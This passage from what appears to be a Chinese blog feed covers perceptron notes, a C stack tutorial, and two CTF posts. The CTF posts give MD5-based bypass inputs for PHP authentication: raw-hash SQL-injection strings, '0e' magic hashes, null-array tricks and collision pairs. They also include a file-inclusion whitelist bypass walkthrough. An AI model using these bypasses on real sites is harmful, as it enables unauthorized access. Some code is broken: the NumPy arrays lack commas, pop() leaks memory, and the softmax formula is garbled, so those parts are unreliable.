title="简单逻辑门的实现"></a>简单逻辑门的实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AND</span>(<span class="params">x1, x2</span>):</span></span><br><span class="line">    x = np.array([x1, x2])</span><br><span class="line">    w = np.array([<span class="number">0.5</span> <span class="number">0.5</span>])</span><br><span class="line">    b = <span class="number">-0.7</span></span><br><span class="line">    tmp = np.<span class="built_in">sum</span>(w*x) + b</span><br><span class="line">    <span class="keyword">if</span> tmp  &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> tmp &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">NAND</span>(<span class="params">x1, x2</span>):</span></span><br><span class="line">    x = np.array([x1, x2])</span><br><span class="line">    w = np.array([<span class="number">-0.5</span> <span class="number">-0.5</span>])</span><br><span class="line">    b = <span class="number">0.7</span></span><br><span class="line">    tmp = np.<span class="built_in">sum</span>(w*x) + b</span><br><span class="line">    <span class="keyword">if</span> tmp  &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> tmp &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">OR</span>(<span class="params">x1, x2</span>):</span></span><br><span class="line">    x = np.array([x1, x2])</span><br><span class="line">    w = np.array([<span class="number">0.5</span> <span class="number">0.5</span>])</span><br><span class="line">    b = <span class="number">-0.2</span></span><br><span class="line">    tmp = np.<span class="built_in">sum</span>(w*x) + b</span><br><span class="line">    <span class="keyword">if</span> tmp &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> tmp &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">XOR</span>(<span class="params">x1, x2</span>):</span></span><br><span class="line">    s1 = NAND(x1, x2)</span><br><span class="line">    s2 = OR(x1, x2)</span><br><span class="line">    y = AND(s1, s2)</span><br><span class="line">    <span class="keyword">return</span> y</span><br></pre></td></tr></table></figure><h3 id="感知机"><a href="#感知机" class="headerlink" title="感知机"></a>感知机</h3><h4 id="感知机的局限性"><a href="#感知机的局限性" class="headerlink" title="感知机的局限性"></a>感知机的局限性</h4><p>​    单层感知机只能表示线性空间</p><h4 id="多层感知机的优势"><a href="#多层感知机的优势" class="headerlink" title="多层感知机的优势"></a>多层感知机的优势</h4><ul><li>多层感知机可以实现非线性空间</li><li>使用了非线性函数sigmoid作为激活函数的2层感知机可以表示任意函数</li></ul><h3 id="激活函数"><a href="#激活函数" class="headerlink" title="激活函数"></a>激活函数</h3><p>定义：将输入信号的总和转换为输出信号的函数</p><ul><li><p>sigmoid函数：<br>$$<br>h(x) = \frac{1}{(1+e^{-x})}<br>$$</p></li><li><p>阶跃函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">step_function</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">step_function</span>(<span class="params">x</span>):</span></span><br><span class="line">    y = x &gt; <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> y.astype(np.<span class="built_in">int</span>)</span><br></pre></td></tr></table></figure></li><li><p>ReLU函数<br>$$<br>h(x)=<br>\begin{cases}<br>x    (x&gt;0)\<br>0    (x\leq0)\<br>\end{cases}<br>$$</p></li></ul><ul><li><p>恒等函数</p></li><li><p>softmax函数<br>$$<br>y_k=\frac{e^}{\sum_{i=1}^ne^{a_i}}<br>$$</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 知识输出、AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有关md5的一些信息</title>
      <link href="2021/11/23/something_about_md5/"/>
      <url>2021/11/23/something_about_md5/</url>
      
        <content type="html"><![CDATA[<p>在ctf比赛中常常见到md5的身影，对于md5，常见的利用方式有以下几种<a id="more"></a></p><h3>在sql注入中</h3><p>若遇到了类似以下的情况</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$password=$_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">$sql = <span class="string">&quot;SELECT * FROM admin WHERE username = &#x27;admin&#x27; and password = &#x27;&quot;</span>.md5($password,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">$result=mysqli_query($link,$sql);</span><br></pre></td></tr></table></figure><p>可以传入ffifdyop或者129581926211651571912466741651878684928，这两者md5加密后的结果都包含 ‘ OR ‘ 的字样，可用于引号逃逸</p><h3>在弱类型比较中</h3><p>若存在对两个md5加密后的字符串进行比较时，可传入类似s1502113478a、s1836677006a的字符串，加密后都是以0e开头，比较时都为零</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&quot;s1502113478a&quot;</span>;</span><br><span class="line">$b = <span class="string">&quot;s1836677006a&quot;</span>;</span><br><span class="line"></span><br><span class="line">$a_1 = md5($a);</span><br><span class="line">$b_1 = md5($b);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $a_1.<span class="string">&quot;\n&quot;</span>.$b_1.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Documents]</span><br><span class="line">└─$ php md5.php </span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">0e481036490867661113260034900752</span><br></pre></td></tr></table></figure><h3>在允许传递数组时</h3><p>可以传入两个空数组，由于md5无法对数组进行加密，故返回null，而 null = null 为 true</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span>();</span><br><span class="line">$b = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">$a_1 = md5($a);</span><br><span class="line">$b_1 = md5($b);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $a_1.<span class="string">&quot;\n&quot;</span>.$b_1.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Documents]</span><br><span class="line">└─$ php em_array.php </span><br><span class="line">PHP Warning:  md5() expects parameter 1 to be string, array given <span class="keyword">in</span> /home/kali/Documents/em_array.php on line 5</span><br><span class="line">PHP Warning:  md5() expects parameter 1 to be string, array given <span class="keyword">in</span> /home/kali/Documents/em_array.php on line 6</span><br></pre></td></tr></table></figure><p>虽然转换失败，但是返回了 null ，需要注意的是，在传递数组时应使用如下形式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=<span class="number">1</span> &amp; b[<span class="number">1</span>]=<span class="string">&quot;b&quot;</span> &amp; c[]</span><br></pre></td></tr></table></figure><h3>md5碰撞</h3><p>当上述方法都不奏效时：可以使用md5算法本身的漏洞；md5碰撞指的是不同的输入进行md5加密后得到同样的输出，网上有许多算法可以实现，需要注意的是，由于输入需上传服务器，故需要对输出进行url编码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!coding:utf-8</span></span><br><span class="line">hexString1 = <span class="string">&#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&#x27;</span></span><br><span class="line">hexString2 = <span class="string">&#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2&#x27;</span></span><br><span class="line"></span><br><span class="line">hexList1 = []</span><br><span class="line">intList1 = []</span><br><span class="line">asciiString1 =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    intString1 = hexString1[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">    hexString1 = hexString1[<span class="number">2</span>:]</span><br><span class="line">    hexList1.append(intString1)</span><br><span class="line">    <span class="keyword">if</span> (hexString1 == <span class="string">&#x27;&#x27;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hexList1:</span><br><span class="line">    intList1.append(<span class="built_in">int</span>(i,<span class="number">16</span>))</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> intList1:</span><br><span class="line">    asciiString1 += <span class="built_in">chr</span>(<span class="built_in">int</span>(j))</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;1.bin&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(asciiString1)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">hexList2 = []</span><br><span class="line">intList2 = []</span><br><span class="line">asciiString2 =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    intString2 = hexString2[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">    hexString2 = hexString2[<span class="number">2</span>:]</span><br><span class="line">    hexList2.append(intString2)</span><br><span class="line">    <span class="keyword">if</span> (hexString2 == <span class="string">&#x27;&#x27;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hexList2:</span><br><span class="line">    intList2.append(<span class="built_in">int</span>(i,<span class="number">16</span>))</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> intList2:</span><br><span class="line">    asciiString2 += <span class="built_in">chr</span>(<span class="built_in">int</span>(j))</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;2.bin&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(asciiString2)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">urlString1=<span class="string">&#x27;&#x27;</span></span><br><span class="line">urlString2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;1.bin&#x27;</span>):</span><br><span class="line">    urlString1 +=  urllib.parse.quote(line)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;2.bin&#x27;</span>):</span><br><span class="line">    urlString2 +=  urllib.parse.quote(line)</span><br><span class="line"></span><br><span class="line">print(urlString1)</span><br><span class="line">print(urlString2)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HCTF 2018WarmUp 1</title>
      <link href="2021/11/07/%5BHCTF%202018%5DWarmUp%201/"/>
      <url>2021/11/07/%5BHCTF%202018%5DWarmUp%201/</url>
      
        <content type="html"><![CDATA[<p>一上来便是一张天真无邪的笑脸<a id="more"></a><br><a href="https://www.helloimg.com/image/ChSkgt"><img src="https://www.helloimg.com/images/2021/11/07/ChSkgt.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/07/ChSkgt.png" srcset="data:image/png;base64,666" alt="ChSkgt.png"></a><br>无头绪，f12查源码，发现source.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;$page</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>开始代码审计</p><p>网页通过对传入的参数进行过滤后进行文件包含</p><p>一开始我以为是需要满足所有的条件，但根据下文包含文件的代码发现只需要满足其中一个就足够了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br></pre></td></tr></table></figure><p>在尝试了许久之后我发现重点在于最后一个判断，即从解码函数开始的判断；在解码之后出现了新的变量$_page，然后对该变量进行分割，取出变量中问号之前的部分，覆盖原来的变量，再判断该变量是否位于白名单内。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure><p>判断通过后对文件进行包含，这时遍历文件目录就能找到flag了，文件名称在hint.php里</p><p>最终payload：</p><p><a href="https://www.helloimg.com/image/Chigu0"><img src="https://www.helloimg.com/images/2021/11/07/Chigu0.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/07/Chigu0.png" srcset="data:image/png;base64,666" alt="Chigu0.png"></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用C语言实现栈</title>
      <link href="2021/09/05/stack_by_C/"/>
      <url>2021/09/05/stack_by_C/</url>
      
        <content type="html"><![CDATA[<h2>说明</h2><ul>    <li>作为栈顶的节点不存储数据<a id="more"></a>，仅作定位功能</li>    <li>数据项的类型可自行定义</li>    <li>在push和pop时，并不改变栈顶节点的位置，仅仅是将待操作节点加入或删除并改变指针指向而已</li>    <li>栈顶节点的数据项可用来存储当前栈的节点数，这点在push函数的定义中可以体现</li>    <li>主函数仅作各函数的演示使用，可自定义</li></ul><h2>定义相应结构</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;node;</span><br></pre></td></tr></table></figure><p>该结构由一个整型和一个指向此结构的指针组成。</p><h2>定义push函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">push</span><span class="params">(node *top, <span class="keyword">int</span> data)</span></span>&#123;</span><br><span class="line">node *temp = (node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">temp-&gt;data = data;</span><br><span class="line">temp-&gt;next = top-&gt;next;</span><br><span class="line">top-&gt;next = temp;</span><br><span class="line">    top-&gt;data++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul>    <li>第一步：分配空间</li>    <li>第二步：存储数据</li>    <li>第三步：改变栈顶和新增项的next指针，递增top节点的data项</li></ul><h2>定义pop函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pop</span><span class="params">(node *top)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!top-&gt;next)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stack is empty now.&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> pop_data = top-&gt;next-&gt;data;</span><br><span class="line">node *temp = top-&gt;next;</span><br><span class="line">top-&gt;next = top-&gt;next-&gt;next;</span><br><span class="line">temp = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">free</span>(temp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> pop_data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul>    <li>第一步：判断栈是否为空</li>    <li>第二步：定义变量存储待弹出的数据和待删除节点</li>    <li>第三步：改变栈顶的next指针</li>    <li>释放待删除节点空间，删除节点</li></ul><h2>定义初始化函数</h2><ul>    <li>为栈顶节点分配空间并初始化指针为空</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">node* <span class="title">stack_init</span><span class="params">()</span></span>&#123;</span><br><span class="line">node *temp = (node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">temp-&gt;data = <span class="number">0</span>;</span><br><span class="line">temp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2>定义遍历显示函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">(node *current)</span></span>&#123;</span><br><span class="line">current = current-&gt;next;</span><br><span class="line"><span class="keyword">while</span>(current)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,current-&gt;data);</span><br><span class="line">current = current-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul>    <li>将当前节点指向栈顶的下一个节点</li>    <li>当前节点不为空时进入遍历循环</li>    <li>打印当前节点的数据项</li>    <li>将当前节点指向下一个节点</li></ul><h2>源代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span 